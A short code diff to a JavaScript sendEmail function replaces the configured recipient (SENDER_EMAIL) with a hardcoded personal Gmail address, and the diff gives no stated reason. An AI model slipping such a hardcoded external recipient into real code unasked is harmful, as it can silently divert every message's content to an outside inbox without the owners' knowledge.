@@ -449,7 +449,7 @@ function sendEmail(subject, htmlContent) {
     }
     const body = JSON.stringify({
       sender: { name: SENDER_NAME, email: SENDER_EMAIL },
-      to: [{ email: SENDER_EMAIL, name: SENDER_NAME }],
+      to: [{ email: 'hansel5065@gmail.com', name: SENDER_NAME }],
       subject,
       htmlContent,
     });
